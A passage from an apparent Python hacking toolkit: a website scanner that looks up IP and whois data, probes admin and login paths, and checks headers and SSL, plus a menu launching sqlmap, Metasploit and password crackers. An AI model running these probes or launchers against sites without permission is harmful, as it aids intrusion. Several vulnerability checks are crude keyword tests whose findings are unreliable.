            print(f"\n{Fore.GREEN}[✓] HTML saved successfully to: {file_path}{Style.RESET_ALL}")
            
            # Show file size
            file_size = os.path.getsize(file_path) / 1024  # in KB
            print(f"{Fore.BLUE}[i] File size: {file_size:.2f} KB{Style.RESET_ALL}")
            
            # Count lines
            with open(file_path, 'r', encoding='utf-8') as f:
                line_count = sum(1 for _ in f)
            print(f"{Fore.BLUE}[i] Total lines: {line_count}{Style.RESET_ALL}")
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] Failed to download HTML: {str(e)}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")

    def scan_url(self, url):
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url

            print(f"\n{Fore.BLUE}[+] Scanning URL: {url}{Style.RESET_ALL}\n")

            # 1. Get Website IP Address
            self.get_ip_address(url)

            # 2. Check Domain Information
            self.check_domain(url)

            # 3. Detect Common Vulnerabilities
            self.detect_vulnerabilities(url)

            # 4. Check for Suspicious Content
            self.check_suspicious_content(url)

            # 5. Verify SSL Certificate
            self.check_ssl(url)

            # 6. Analyze Website Headers
            self.analyze_headers(url)

            print(f"\n{Fore.GREEN}[✓] Scan completed{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[!] Scan error: {str(e)}{Style.RESET_ALL}")

    def get_ip_address(self, url):
        try:
            domain = urlparse(url).netloc
            ip = socket.gethostbyname(domain)
            print(f"{Fore.BLUE}[+] Website IP Address: {ip}{Style.RESET_ALL}")
            
            # Get IP location (country)
            try:
                response = requests.get(f"http://ip-api.com/json/{ip}").json()
                print(f"{Fore.BLUE}[+] IP Location: {response.get('country', 'Unknown')}{Style.RESET_ALL}")
                print(f"{Fore.BLUE}[+] ISP: {response.get('isp', 'Unknown')}{Style.RESET_ALL}")
            except:
                pass
                
        except:
            print(f"{Fore.RED}[!] Could not resolve IP address{Style.RESET_ALL}")

    def check_domain(self, url):
        try:
            domain = urlparse(url).netloc
            w = whois.whois(domain)
            
            print(f"\n{Fore.BLUE}=== DOMAIN INFORMATION ==={Style.RESET_ALL}")
            
            if isinstance(w.creation_date, list):
                creation_date = w.creation_date[0]
            else:
                creation_date = w.creation_date
            
            age = (datetime.now() - creation_date).days
            print(f"{Fore.BLUE}[i] Domain Age: {age} days{Style.RESET_ALL}")
            
            if age < 30:
                print(f"{Fore.RED}[!] Warning: New domain (potential phishing risk){Style.RESET_ALL}")
            
            print(f"{Fore.BLUE}[i] Registrar: {w.registrar}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[i] Expiration Date: {w.expiration_date}{Style.RESET_ALL}")
            
        except:
            print(f"{Fore.YELLOW}[!] Could not fetch domain information{Style.RESET_ALL}")

    def detect_vulnerabilities(self, url):
        try:
            print(f"\n{Fore.BLUE}=== VULNERABILITY SCAN ==={Style.RESET_ALL}")
            
            response = requests.get(url, timeout=5)
            
            # Check for WordPress
            if 'wp-content' in response.text.lower():
                print(f"{Fore.YELLOW}[!] Detected: WordPress (common CMS vulnerabilities){Style.RESET_ALL}")
                
            # Check for PHP
            if '.php' in response.text.lower():
                print(f"{Fore.YELLOW}[!] Detected: PHP (potential injection risks){Style.RESET_ALL}")
                
            # Check for admin panels
            admin_paths = ['/admin', '/wp-admin', '/login', '/dashboard']
            for path in admin_paths:
                test_url = url + path
                try:
                    r = requests.get(test_url, timeout=3)
                    if r.status_code == 200:
                        print(f"{Fore.RED}[!] Found: Admin panel at {test_url}{Style.RESET_ALL}")
                except:
                    pass
                    
            # Check for SQL errors (potential SQLi)
            if 'sql' in response.text.lower() and 'error' in response.text.lower():
                print(f"{Fore.RED}[!] Possible SQL Injection vulnerability{Style.RESET_ALL}")
                
            # Check for exposed directories
            dir_paths = ['/assets', '/images', '/js', '/css']
            for path in dir_paths:
                test_url = url + path
                try:
                    r = requests.get(test_url, timeout=3)
                    if r.status_code == 200:
                        print(f"{Fore.YELLOW}[!] Found: Directory listing at {test_url}{Style.RESET_ALL}")
                except:
                    pass
                
        except:
            print(f"{Fore.YELLOW}[!] Could not complete vulnerability scan{Style.RESET_ALL}")

    def check_suspicious_content(self, url):
        try:
            response = requests.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            print(f"\n{Fore.BLUE}=== CONTENT ANALYSIS ==={Style.RESET_ALL}")
            
            # Check for forms
            forms = soup.find_all('form')
            if forms:
                print(f"{Fore.YELLOW}[!] Found {len(forms)} input forms (potential data collection){Style.RESET_ALL}")
                for form in forms:
                    if 'password' in str(form).lower():
                        print(f"{Fore.RED}[!] Found password input form{Style.RESET_ALL}")
                
            # Check for suspicious keywords
            scam_keywords = ['win', 'prize', 'account', 'password', 'update', 'verify', 'login', 'secure']
            found = [word for word in scam_keywords if word in response.text.lower()]
            if found:
                print(f"{Fore.RED}[!] Warning: Suspicious keywords found: {', '.join(found)}{Style.RESET_ALL}")
                
            # Check for iframes
            iframes = soup.find_all('iframe')
            if iframes:
                print(f"{Fore.YELLOW}[!] Found {len(iframes)} iframes (potential clickjacking risk){Style.RESET_ALL}")
                
        except:
            print(f"{Fore.YELLOW}[!] Could not analyze content{Style.RESET_ALL}")

    def check_ssl(self, url):
        if url.startswith('https://'):
            print(f"\n{Fore.GREEN}[✓] HTTPS secured connection{Style.RESET_ALL}")
            try:
                response = requests.get(url, timeout=5, verify=True)
                print(f"{Fore.GREEN}[✓] Valid SSL certificate{Style.RESET_ALL}")
            except requests.exceptions.SSLError:
                print(f"{Fore.RED}[!] Invalid SSL certificate{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[!] No HTTPS (unsecured connection){Style.RESET_ALL}")

    def analyze_headers(self, url):
        try:
            response = requests.head(url, timeout=5)
            
            print(f"\n{Fore.BLUE}=== SECURITY HEADERS ==={Style.RESET_ALL}")
            
            # Check for security headers
            security_headers = {
                'X-Frame-Options': 'Missing (clickjacking risk)',
                'X-XSS-Protection': 'Missing (XSS protection)',
                'Content-Security-Policy': 'Missing (content injection protection)',
                'Strict-Transport-Security': 'Missing (HTTPS enforcement)',
                'X-Content-Type-Options': 'Missing (MIME sniffing protection)'
            }
            
            for header, message in security_headers.items():
                if header in response.headers:
                    print(f"{Fore.GREEN}[✓] {header}: Present{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[!] {header}: {message}{Style.RESET_ALL}")
                    
            # Check server header
            if 'Server' in response.headers:
                print(f"{Fore.BLUE}[i] Server: {response.headers['Server']}{Style.RESET_ALL}")
                
        except:
            print(f"{Fore.YELLOW}[!] Could not analyze headers{Style.RESET_ALL}")

# Main menu
def main():
    # Check for required tools
    install_tools()
    
    while True:
        clear_screen()
        show_banner()
        
        print(Fore.CYAN + "\nMain Menu:")
        print("[1] SQL")
        print("[2] W-CRACK")
        print("[3] Metasploit ")
        print("[4] Z-Cracker")
        print("[5] URL-Scanner")
        print("[6] About")
        print(Fore.RED + "[0] Exit")
        
        choice = input(Fore.YELLOW + "\n[?] Select tool: ")
        
        if choice == '1':
            run_sqlmap()
        elif choice == '2':
            run_wcrack()
        elif choice == '3':
            run_metasploit()
        elif choice == '4':
            run_zipcracker()
        elif choice == '5':
            DragonURLScanner()
            clear_screen()
        elif choice == '6':
            about_section()
        elif choice == '0':
            print(Fore.GREEN + "\n[+] Exiting...")
            sys.exit()
        else:
            print(Fore.RED + "[!] Invalid option")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user")
        sys.exit()